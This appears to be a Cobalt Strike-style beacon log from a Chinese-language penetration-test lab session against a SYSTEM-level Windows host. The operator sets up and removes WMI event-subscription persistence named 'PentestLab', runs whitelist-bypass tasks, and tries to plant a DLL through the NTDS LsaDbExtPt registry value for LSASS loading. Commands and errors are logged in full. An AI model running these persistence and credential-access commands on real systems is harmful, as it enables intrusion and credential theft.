01/27 14:16:32 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 1892; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 14:17:47 [task] 4*************进行WMI启动**********
01/27 14:17:47 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 14:17:47 [task] 4********WMI已启动,测试后需删除**********
01/27 14:18:27 [checkin] host called home, sent: 673 bytes
01/27 14:18:36 [output]
received output:
Instance creation successful.


01/27 14:18:36 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:18:36 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:20:14 [task] 4************白名单绕过*************
01/27 14:20:26 [task] 4*************LSA Disver************
01/27 14:20:26 [task] 执行代码 4注：本攻击基于管理员权限，请先提权
01/27 14:20:36 [checkin] host called home, sent: 432 bytes
01/27 14:20:56 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 14:20:56 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 14:20:56 [output]
received output:
Windows PowerShell 
版权所有 (C) 2009 Microsoft Corporation。保留所有权利。



01/27 14:41:46 [task] 4*************进行WMI删除**********
01/27 14:41:46 [task] 删除WMI
01/27 14:41:46 [task] 4**************WMI已删除**********
01/27 14:41:56 [checkin] host called home, sent: 165 bytes
01/27 14:42:06 [error] could not spawn Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose: 2
01/27 14:42:06 [output]
received output:
Windows PowerShell 
版权所有 (C) 2009 Microsoft Corporation。保留所有权利。



01/27 14:50:13 [task] 4*************进行WMI启动**********
01/27 14:50:13 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 14:50:13 [task] 4********WMI已启动,测试后需删除**********
01/27 14:51:06 [checkin] host called home, sent: 673 bytes
01/27 14:51:08 [output]
received output:
Instance creation successful.


01/27 14:51:08 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:51:08 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:51:54 [task] 4*************进行WMI启动**********
01/27 14:51:54 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 14:51:54 [task] 4********WMI已启动,测试后需删除**********
01/27 14:52:08 [checkin] host called home, sent: 673 bytes
01/27 14:52:08 [output]
received output:
Instance creation successful.


01/27 14:52:08 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:52:08 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 14:52:52 [task] 4*************进行WMI删除**********
01/27 14:52:52 [task] 删除WMI
01/27 14:52:52 [task] 4**************WMI已删除**********
01/27 14:53:08 [checkin] host called home, sent: 148 bytes
01/27 14:53:10 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 14:55:05 [task] 4*************进行WMI删除**********
01/27 14:55:05 [task] 删除WMI
01/27 14:55:05 [task] 4**************WMI已删除**********
01/27 14:55:10 [checkin] host called home, sent: 148 bytes
01/27 14:55:11 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 14:56:56 [input] <neo> powershell Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 14:56:56 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 14:57:11 [checkin] host called home, sent: 383 bytes
01/27 14:57:11 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="verbose">对目标“\\A-PC\ROOT\Subscription:__EventFilter.Name="PentestLab"”执行操作“Remove-WmiObject”。</S></Objs>

01/27 14:58:22 [task] 4*************进行WMI删除**********
01/27 14:58:22 [task] 删除WMI
01/27 14:58:22 [task] 4**************WMI已删除**********
01/27 14:59:12 [checkin] host called home, sent: 148 bytes
01/27 14:59:12 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:00:44 [task] 4*************进行WMI删除**********
01/27 15:00:44 [task] 删除WMI
01/27 15:00:44 [task] 4**************WMI已删除**********
01/27 15:01:12 [checkin] host called home, sent: 148 bytes
01/27 15:01:12 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:05:57 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 1892; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 15:06:10 [task] 4*************进行WMI删除**********
01/27 15:06:10 [task] 删除WMI
01/27 15:06:10 [task] 4**************WMI已删除**********
01/27 15:06:21 [task] 4*************进行WMI删除**********
01/27 15:06:21 [task] 删除WMI
01/27 15:06:21 [task] 4**************WMI已删除**********
01/27 15:06:55 [checkin] host called home, sent: 296 bytes
01/27 15:06:55 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:06:55 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:07:42 [task] 4*************进行WMI删除**********
01/27 15:07:42 [task] 删除WMI
01/27 15:07:55 [checkin] host called home, sent: 148 bytes
01/27 15:07:56 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:11:14 [task] 4*************进行WMI删除**********
01/27 15:11:14 [task] 删除WMI
01/27 15:11:14 [task] powershell Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:11:56 [checkin] host called home, sent: 148 bytes
01/27 15:11:56 [output]
received output:
Get-WmiObject : Invalid query 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\Subscription -Class __EventFilter -Filter
 Name='PentestLab' | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:14:14 [task] 4*************进行WMI删除**********
01/27 15:14:14 [task] 删除WMI
01/27 15:14:14 [task] powershell "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='PentestLab'\" | Remove-WmiObject -Verbose"
01/27 15:14:56 [checkin] host called home, sent: 153 bytes
01/27 15:14:57 [output]
received output:
Get-WmiObject : Invalid parameter 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\\Subscription -Class __EventFilter -Filte
r "Name='PentestLab'" | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:16:19 [task] 4*************进行WMI启动**********
01/27 15:16:19 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 15:16:19 [task] 4********WMI正在启动,测试后需删除**********
01/27 15:16:57 [checkin] host called home, sent: 673 bytes
01/27 15:17:05 [output]
received output:
Instance creation successful.


01/27 15:17:05 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:17:05 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:18:30 [task] 4*************进行WMI启动**********
01/27 15:18:30 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 15:18:30 [task] 4********WMI正在启动,测试后需删除**********
01/27 15:19:05 [checkin] host called home, sent: 673 bytes
01/27 15:19:06 [output]
received output:
Instance creation successful.


01/27 15:19:06 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:19:06 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:20:11 [task] 4*************进行WMI删除**********
01/27 15:20:11 [task] 删除WMI
01/27 15:20:11 [task] powershell "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='PentestLab'\" | Remove-WmiObject -Verbose"
01/27 15:21:06 [checkin] host called home, sent: 153 bytes
01/27 15:21:07 [output]
received output:
Get-WmiObject : Invalid parameter 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\\Subscription -Class __EventFilter -Filte
r "Name='PentestLab'" | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:22:55 [task] 4*************进行WMI删除**********
01/27 15:22:55 [task] 删除WMI
01/27 15:22:55 [task] 
01/27 15:26:54 [task] 4*************进行WMI删除**********
01/27 15:26:54 [task] 删除WMI
01/27 15:26:54 [task] 
01/27 15:27:09 [task] 4*************进行WMI删除**********
01/27 15:27:09 [task] 删除WMI
01/27 15:27:09 [task] 
01/27 15:27:26 [task] 4*************进行WMI启动**********
01/27 15:27:26 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 15:27:26 [task] 4********WMI正在启动,测试后需删除**********
01/27 15:27:33 [task] 4*************进行WMI删除**********
01/27 15:27:33 [task] 删除WMI
01/27 15:27:33 [task] wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
01/27 15:27:51 [task] 4*************进行WMI删除**********
01/27 15:27:51 [task] 删除WMI
01/27 15:27:51 [task] wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
01/27 15:28:07 [checkin] host called home, sent: 673 bytes
01/27 15:28:07 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:28:07 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:28:07 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:28:19 [task] 4*************进行WMI删除**********
01/27 15:28:19 [task] 删除WMI
01/27 15:28:19 [task] wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
01/27 15:28:46 [task] 4*************进行WMI删除**********
01/27 15:28:46 [task] 删除WMI
01/27 15:28:46 [task] wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
01/27 15:28:58 [task] 4*************进行WMI删除**********
01/27 15:28:58 [task] 删除WMI
01/27 15:28:58 [task] powershell "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='PentestLab'\" | Remove-WmiObject -Verbose"
01/27 15:29:07 [checkin] host called home, sent: 153 bytes
01/27 15:29:08 [output]
received output:
Get-WmiObject : Invalid parameter 
所在位置 行:1 字符: 14
+ Get-WMIObject <<<<  -Namespace root\\Subscription -Class __EventFilter -Filte
r "Name='PentestLab'" | Remove-WmiObject -Verbose
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], Managemen 
   tException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C 
   ommands.GetWmiObjectCommand
 


01/27 15:33:36 [input] <neo> shell powershell
01/27 15:33:36 [task] Tasked beacon to run: powershell
01/27 15:34:08 [checkin] host called home, sent: 41 bytes
01/27 15:34:18 [output]
received output:
Windows PowerShell 
版权所有 (C) 2009 Microsoft Corporation。保留所有权利。



01/27 15:34:18 [input] <neo> shell Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:34:18 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:35:18 [checkin] host called home, sent: 150 bytes
01/27 15:35:18 [output]
received output:
'Get-WMIObject' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


01/27 15:36:34 [input] <neo> powershell Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:36:34 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:37:18 [checkin] host called home, sent: 383 bytes
01/27 15:37:19 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="verbose">对目标“\\A-PC\ROOT\Subscription:__EventFilter.Name="PentestLab"”执行操作“Remove-WmiObject”。</S></Objs>

01/27 15:42:12 [task] 4*************进行WMI删除**********
01/27 15:42:12 [task] 删除WMI
01/27 15:42:12 [task] Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:42:12 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:42:19 [checkin] host called home, sent: 383 bytes
01/27 15:46:21 [task] 4*************进行WMI启动**********
01/27 15:46:21 [task] 启动WMI 4注：本攻击基于管理员权限，请先提权
01/27 15:46:21 [task] 4********WMI正在启动,测试后需删除**********
01/27 15:47:19 [checkin] host called home, sent: 673 bytes
01/27 15:47:20 [output]
received output:
Instance creation successful.


01/27 15:47:20 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:47:20 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 15:52:13 [task] 4*************进行WMI删除**********
01/27 15:52:13 [task] 删除WMI
01/27 15:52:13 [task] Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:52:13 [task] Tasked beacon to run: Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='PentestLab'" | Remove-WmiObject -Verbose
01/27 15:52:20 [checkin] host called home, sent: 383 bytes
01/27 15:52:21 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="verbose">对目标“\\A-PC\ROOT\Subscription:__EventFilter.Name="PentestLab"”执行操作“Remove-WmiObject”。</S></Objs>

01/27 16:00:31 [task] 4************白名单绕过*************
01/27 16:01:21 [checkin] host called home, sent: 78 bytes
01/27 16:08:30 [task] 4************白名单绕过*************
01/27 16:08:31 [checkin] host called home, sent: 79 bytes
01/27 16:43:46 [task] 4************白名单绕过*************
01/27 16:44:41 [checkin] host called home, sent: 80 bytes
01/27 16:53:17 [task] 4************白名单绕过*************
01/27 16:53:42 [checkin] host called home, sent: 80 bytes
01/27 16:54:14 [task] 4************白名单绕过*************
01/27 16:54:42 [checkin] host called home, sent: 80 bytes
01/27 17:00:52 [task] 4************白名单绕过*************
01/27 17:01:42 [checkin] host called home, sent: 80 bytes
01/27 17:03:57 [task] 4************白名单绕过*************
01/27 17:04:42 [checkin] host called home, sent: 80 bytes
01/27 18:06:55 [task] 4*************LSA Disver************
01/27 18:06:55 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:06:55 [task] Tasked beacon to run: Remove-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:06:55 [task] Tasked beacon to run: new-ItemProperty  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value '"c:	emplsass_lib.dll","\sharelulzlsass_lib.dll"'
01/27 18:07:43 [checkin] host called home, sent: 750 bytes
01/27 18:07:44 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">无法将“Remove-New-ItemProperty”项识别为 cmdlet、函数、脚本文件或可运行程序的_x000D__x000A_</S><S S="Error">名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 24_x000D__x000A_</S><S S="Error">+ Remove-New-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SYSTEM\CurrentControlSet\Services\N_x000D__x000A_</S><S S="Error">TDS -Name LsaDbExtPt_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Remove-New-ItemProperty:String) _x000D__x000A_</S><S S="Error">    [], CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:07:44 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 该属性已存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;   -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -N_x000D__x000A_</S><S S="Error">ame LsaDbExtPt -Value '"c:    emplsass_lib.dll","\sharelulzlsass_lib.dll"'_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ResourceExists: (HKEY_LOCAL_MACH...t\Services\NT _x000D__x000A_</S><S S="Error">   DS:String) [New-ItemProperty], IOException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Comma _x000D__x000A_</S><S S="Error">   nds.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:08:57 [task] 4*************LSA Disver************
01/27 18:08:57 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:08:57 [task] Tasked beacon to run: Remove-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:08:57 [task] Tasked beacon to run: 
01/27 18:09:44 [checkin] host called home, sent: 370 bytes
01/27 18:09:45 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">无法将“Remove-New-ItemProperty”项识别为 cmdlet、函数、脚本文件或可运行程序的_x000D__x000A_</S><S S="Error">名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 24_x000D__x000A_</S><S S="Error">+ Remove-New-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SYSTEM\CurrentControlSet\Services\N_x000D__x000A_</S><S S="Error">TDS -Name LsaDbExtPt_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Remove-New-ItemProperty:String) _x000D__x000A_</S><S S="Error">    [], CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:09:45 [output]
received output:
无法处理命令，因为缺少参数。命令必须后跟 -Command。

PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}] 
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>] 
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

-PSConsoleFile
    加载指定的 Windows PowerShell 控制台文件。若要创建控制台
    文件，请使用 Windows PowerShell 的 Export-Console。

-Version
    启动 Windows PowerShell 的指定版本。

-NoLogo
    启动时隐藏版权标志。

-NoExit
    运行完启动命令后不退出。

-Sta
    使用单线程单元启动 shell。

-NoProfile
    不使用用户配置文件。

-NonInteractive
    不向用户显示交互式提示。

-InputFormat
    说明发送到 Windows PowerShell 的数据的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-OutputFormat
    确定 Windows PowerShell 输出内容的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-WindowStyle
    将窗口样式设置为 Normal、Minimized、Maximized 或 Hidden。

-EncodedCommand
    接受命令的 Base 64 编码字符串版本。使用此参数向
    Windows PowerShell 提交需要复杂引号或
    大括号的命令。

-File
    执行脚本文件。

-ExecutionPolicy
    设置会话的默认执行策略。

-Command
    以执行好像从 Windows PowerShell 命令提示符下键入的命令那样
    执行指定的命令和所有参数，如果未指定 NoExit，则随后将
    退出。Command 的值可以为"-"、字符串或
    脚本块。

    如果 Command 的值为"-"，则将从标准输入设备读取命令
    文本。

    如果 Command 的值为脚本块，则脚本块必须括在
    大括号({})中。只有在 Windows PowerShell 中运行 PowerShell.exe 时才能指定
    脚本块。脚本块的结果作为反序列化 XML 对象(而非活动对象)返回到
    父 shell。

    如果 Command 的值为字符串，则 Command 必须是该命令的
    最后一个形式参数，因为其后键入的所有字符都会被解释为
    它的实际参数。

    若要写运行 Windows PowerShell 命令的字符串，请使用以下格式:
	"& {<command>}"
    其中，引号指示一个字符串，调用运算符(&)
    用于执行命令。

-Help、-?、/?
    显示此消息。如果要在 Windows PowerShell 中键入
 PowerShell.exe 命令，    请以连字符(-)作为命令参数的前缀，不要使用
    正斜杠(/)。连字符和正斜杠均可用于 Cmd.exe。

示例
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 1.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand


01/27 18:10:07 [task] 4*************LSA Disver************
01/27 18:10:07 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:10:07 [task] Tasked beacon to run: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:10:07 [task] Tasked beacon to run: 
01/27 18:10:45 [checkin] host called home, sent: 358 bytes
01/27 18:10:45 [output]
received output:
无法处理命令，因为缺少参数。命令必须后跟 -Command。

PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}] 
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>] 
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

-PSConsoleFile
    加载指定的 Windows PowerShell 控制台文件。若要创建控制台
    文件，请使用 Windows PowerShell 的 Export-Console。

-Version
    启动 Windows PowerShell 的指定版本。

-NoLogo
    启动时隐藏版权标志。

-NoExit
    运行完启动命令后不退出。

-Sta
    使用单线程单元启动 shell。

-NoProfile
    不使用用户配置文件。

-NonInteractive
    不向用户显示交互式提示。

-InputFormat
    说明发送到 Windows PowerShell 的数据的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-OutputFormat
    确定 Windows PowerShell 输出内容的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-WindowStyle
    将窗口样式设置为 Normal、Minimized、Maximized 或 Hidden。

-EncodedCommand
    接受命令的 Base 64 编码字符串版本。使用此参数向
    Windows PowerShell 提交需要复杂引号或
    大括号的命令。

-File
    执行脚本文件。

-ExecutionPolicy
    设置会话的默认执行策略。

-Command
    以执行好像从 Windows PowerShell 命令提示符下键入的命令那样
    执行指定的命令和所有参数，如果未指定 NoExit，则随后将
    退出。Command 的值可以为"-"、字符串或
    脚本块。

    如果 Command 的值为"-"，则将从标准输入设备读取命令
    文本。

    如果 Command 的值为脚本块，则脚本块必须括在
    大括号({})中。只有在 Windows PowerShell 中运行 PowerShell.exe 时才能指定
    脚本块。脚本块的结果作为反序列化 XML 对象(而非活动对象)返回到
    父 shell。

    如果 Command 的值为字符串，则 Command 必须是该命令的
    最后一个形式参数，因为其后键入的所有字符都会被解释为
    它的实际参数。

    若要写运行 Windows PowerShell 命令的字符串，请使用以下格式:
	"& {<command>}"
    其中，引号指示一个字符串，调用运算符(&)
    用于执行命令。

-Help、-?、/?
    显示此消息。如果要在 Windows PowerShell 中键入
 PowerShell.exe 命令，    请以连字符(-)作为命令参数的前缀，不要使用
    正斜杠(/)。连字符和正斜杠均可用于 Cmd.exe。

示例
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 1.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand


01/27 18:11:46 [task] 4*************LSA Disver************
01/27 18:11:46 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:11:46 [task] Tasked beacon to run: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:11:46 [task] Tasked beacon to run: 
01/27 18:12:45 [checkin] host called home, sent: 358 bytes
01/27 18:12:45 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services_x000D__x000A_</S><S S="Error">\NTDS 处不存在属性 LsaDbExtPt。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS _x000D__x000A_</S><S S="Error">-Name LsaDbExtPt_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (LsaDbExtPt:String) [Remove-Ite _x000D__x000A_</S><S S="Error">   mProperty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:12:45 [output]
received output:
无法处理命令，因为缺少参数。命令必须后跟 -Command。

PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}] 
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>] 
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

